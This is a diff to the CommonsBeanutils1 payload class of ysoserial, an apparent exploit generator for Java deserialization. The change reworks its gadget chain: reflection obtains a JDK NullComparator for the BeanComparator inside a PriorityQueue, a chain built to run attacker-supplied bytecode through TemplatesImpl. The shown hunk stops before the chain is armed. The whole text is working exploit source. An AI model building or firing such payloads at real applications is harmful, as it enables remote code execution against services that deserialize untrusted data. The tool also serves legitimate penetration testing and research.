@@ -1,25 +1,32 @@
 package ysoserial.payloads;
 
+import java.lang.reflect.Constructor;
 import java.math.BigInteger;
+import java.util.Comparator;
 import java.util.PriorityQueue;
 
 import org.apache.commons.beanutils.BeanComparator;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
-import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
 @Authors({ Authors.FROHOFF })
-public class CommonsBeanutils1 implements ObjectPayload<Object> {
+public class CommonsBeanutils1 extends ParameterizedTransletObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+	protected Object getObject(final Object templates) throws Exception {
+		//NullComparator implements Comparator<?> and Serializable
+		Constructor<?> nullComparatorConstructor = Reflections
+			.getFirstCtor("java.util.Comparators$NullComparator");
+		Comparator<?> nullComparator = (Comparator<?>) nullComparatorConstructor
+			.newInstance(true, null);
+
 		// mock method name until armed
-		final BeanComparator comparator = new BeanComparator("lowestSetBit");
+		final BeanComparator comparator = new BeanComparator("lowestSetBit",
+			nullComparator);
 
 		// create queue with numbers and basic comparator
 		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
